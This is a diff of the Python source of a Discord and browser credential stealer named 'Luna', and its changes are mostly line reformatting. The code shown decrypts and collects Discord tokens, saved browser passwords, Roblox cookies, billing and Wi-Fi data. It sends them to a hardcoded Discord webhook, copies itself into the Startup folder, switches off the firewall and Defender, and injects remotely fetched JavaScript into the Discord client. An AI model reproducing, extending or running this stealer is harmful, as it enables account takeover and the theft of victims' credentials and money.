@@ -23,8 +23,7 @@ from discord import Embed, File, SyncWebhook
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 
-__CONFIG__ = {'webhook': 'https://discordapp.com/api/webhooks/1060162847235121162/pJHW9BnkusLZlmeSX4SmJMo7gpEd1vV_oGvLcMaQMalp3UuYTtX1gj3uLViULNjiYU9B', 'ping': False, 'pingtype': 'None', 'error': False, 'startup': False,
-              'defender': False, 'systeminfo': False, 'backupcodes': False, 'browser': True, 'roblox': False, 'obfuscation': False, 'injection': False, 'minecraft': False, 'wifi': False, 'killprotector': False, 'antidebug_vm': False, 'discord': True}
+__CONFIG__ = {'webhook': 'https://discordapp.com/api/webhooks/1060162847235121162/pJHW9BnkusLZlmeSX4SmJMo7gpEd1vV_oGvLcMaQMalp3UuYTtX1gj3uLViULNjiYU9B', 'ping': False, 'pingtype': 'None', 'error': False, 'startup': False, 'defender': False, 'systeminfo': False, 'backupcodes': False, 'browser': False, 'roblox': False, 'obfuscation': False, 'injection': False, 'minecraft': False, 'wifi': False, 'killprotector': False, 'antidebug_vm': False, 'discord': True}
 
 #global variables
 tempfolder = mkdtemp()
@@ -34,8 +33,7 @@ localappdata = os.getenv("localappdata")
 def main(webhook: str):
     webhook = SyncWebhook.from_url(webhook, session=requests.Session())
 
-    threads = [Browsers, Wifi, Minecraft, BackupCodes,
-               killprotector, fakeerror, startup, disable_defender]
+    threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, startup, disable_defender]
     configcheck(threads)
 
     for func in threads:
@@ -60,8 +58,7 @@ def main(webhook: str):
         zipup()
         _file = None
         _file = File(f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip')
-        webhook.send(content=content, file=_file,
-                     avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
+        webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
 
     if not __CONFIG__["systeminfo"]:
         pass
@@ -115,13 +112,11 @@ def configcheck(list):
 
 
 def fakeerror():
-    ctypes.windll.user32.MessageBoxW(
-        None, 'Error code: 0x80070002\nAn internal error occurred while importing modules.', 'Fatal Error', 0)
+    ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occurred while importing modules.', 'Fatal Error', 0)
 
 
 def startup():
-    startup_path = os.getenv(
-        "appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+    startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
     if os.path.exists(startup_path + argv[0]):
         os.remove(startup_path + argv[0])
         copy2(argv[0], startup_path)
@@ -130,17 +125,13 @@ def startup():
 
 
 def disable_defender():
-    subprocess.call(["netsh", "advfirewall", "set", "publicprofile",
-                    "state", "off"], shell=True, capture_output=True)
-    subprocess.call(["netsh", "advfirewall", "set", "privateprofile",
-                    "state", "off"], shell=True, capture_output=True)
-    subprocess.call(["powershell.exe", "-ExecutionPolicy",
-                    "Unrestricted", "-File", "Disable-WindowsDefender.ps1"])
+    subprocess.call(["netsh", "advfirewall", "set", "publicprofile", "state", "off"], shell=True, capture_output=True)
+    subprocess.call(["netsh", "advfirewall", "set", "privateprofile", "state", "off"], shell=True, capture_output=True)
+    subprocess.call(["powershell.exe", "-ExecutionPolicy", "Unrestricted", "-File", "Disable-WindowsDefender.ps1"])
 
 
 def create_temp(_dir: str or os.PathLike = gettempdir()):
-    file_name = ''.join(random.SystemRandom().choice(
-        'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
+    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
     path = os.path.join(_dir, file_name)
     open(path, "x")
     return path
@@ -195,8 +186,7 @@ class PcInfo:
         computer_os = platform.platform()
         cpu = wmi.WMI().Win32_Processor()[0]
         gpu = wmi.WMI().Win32_VideoController()[0]
-        ram = round(float(wmi.WMI().Win32_OperatingSystem()[
-                    0].TotalVisibleMemorySize) / 1048576, 0)
+        ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
         username = os.getenv("UserName")
         hostname = os.getenv("COMPUTERNAME")
         hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
@@ -208,11 +198,9 @@ class PcInfo:
             name="System Info",
             value=f'''💻 **PC Username:** `{username}`\n:desktop: **PC Name:** `{hostname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n<:cpu:1051512676947349525> **CPU:** `{cpu.Name}`\n<:gpu:1051512654591688815> **GPU:** `{gpu.Name}`\n<:ram1:1051518404181368972> **RAM:** `{ram}GB`''',
             inline=False)
-        embed.set_thumbnail(
-            url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
+        embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
 
-        webhook.send(
-            embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
+        webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
 
 
 class Discord:
@@ -291,8 +279,7 @@ class Discord:
                         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                             for y in re.findall(self.encrypted_regex, line):
                                 try:
-                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[
-                                                             1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
+                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                 except ValueError:
                                     pass
                                 try:
@@ -356,15 +343,11 @@ class Discord:
                 else:
                     embed = Embed(title="Roblox Info", color=5639644)
                     headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
-                    info = requests.get(
-                        "https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
+                    info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
 
-                    embed.add_field(name="<:roblox_icon:1041819334969937931> Name:",
-                                    value=f"`{info['UserName']}`", inline=True)
-                    embed.add_field(name="<:robux_coin:1041813572407283842> Robux:",
-                                    value=f"`{info['RobuxBalance']}`", inline=True)
-                    embed.add_field(name="🍪 Cookie:",
-                                    value=f"`{robo_cookie}`", inline=False)
+                    embed.add_field(name="<:roblox_icon:1041819334969937931> Name:", value=f"`{info['UserName']}`", inline=True)
+                    embed.add_field(name="<:robux_coin:1041813572407283842> Robux:", value=f"`{info['RobuxBalance']}`", inline=True)
+                    embed.add_field(name="🍪 Cookie:", value=f"`{robo_cookie}`", inline=False)
                     embed.set_thumbnail(url=info['ThumbnailUrl'])
 
                     webhook.send(
@@ -390,10 +373,8 @@ class Discord:
                        'Authorization': token}
 
             user = requests.get(self.baseurl, headers=headers).json()
-            payment = requests.get(
-                "https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
-            gift = requests.get(
-                "https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)
+            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
+            gift = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)
 
             username = user['username'] + '#' + user['discriminator']
             discord_id = user['id']
@@ -435,8 +416,7 @@ class Discord:
             if "code" in gift.text:
                 codes = json.loads(gift.text)
                 for code in codes:
-                    val_codes.append(
-                        (code['code'], code['promotion']['outbound_title']))
+                    val_codes.append((code['code'], code['promotion']['outbound_title']))
 
             if val_codes == []:
                 val += f'\n:gift: `No Gift Cards Found`\n'
@@ -569,8 +549,7 @@ class Browsers:
                 url, username, password = res
                 password = self.decrypt_password(password, self.masterkey)
                 if url != "":
-                    f.write(
-                        f"URL: {url}  Username: {username}  Password: {password}\n")
+                    f.write(f"URL: {url}  Username: {username}  Password: {password}\n")
         cursor.close()
         conn.close()
         os.remove(loginvault)
@@ -610,8 +589,7 @@ class Browsers:
                     sites.append((url, title, visit_count, last_visit_time))
             sites.sort(key=lambda x: x[3], reverse=True)
             for site in sites:
-                f.write("Visit Count: {:<6} Title: {:<40}\n".format(
-                    site[2], site[1]))
+                f.write("Visit Count: {:<6} Title: {:<40}\n".format(site[2], site[1]))
         cursor.close()
         conn.close()
         os.remove(historyvault)
@@ -647,8 +625,7 @@ class Browsers:
                     try:
                         for line in f2:
                             if ".ROBLOSECURITY" in line:
-                                robo_cookie = line.split(
-                                    ".ROBLOSECURITY")[1].strip()
+                                robo_cookie = line.split(".ROBLOSECURITY")[1].strip()
                                 f.write(robo_cookie + "\n")
                     except Exception:
                         robo_cookie = "No Roblox Cookies Found"
@@ -670,8 +647,7 @@ class Wifi:
                 self.wifi_list.append(line.split(":")[-1][1:])
             else:
                 with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
-                    f.write(
-                        f'There is no wireless interface on the system. Ethernet using twat.')
+                    f.write(f'There is no wireless interface on the system. Ethernet using twat.')
                 f.close()
 
         for i in self.wifi_list:
@@ -767,8 +743,7 @@ class Injection:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get(
-            "https://raw.githubusercontent.com/Smug246/Luna-Token-Grabber/main/injection.js").text
+        self.code = requests.get("https://raw.githubusercontent.com/Smug246/Luna-Token-Grabber/main/injection.js").text
 
         for dir in self.discord_dirs:
             if not os.path.exists(dir):
@@ -776,8 +751,7 @@ class Injection:
 
             if self.get_core(dir) is not None:
                 with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
-                    f.write((self.code).replace('discord_desktop_core-1',
-                            self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
+                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                     self.start_discord(dir)
 
     def get_core(self, dir: str):
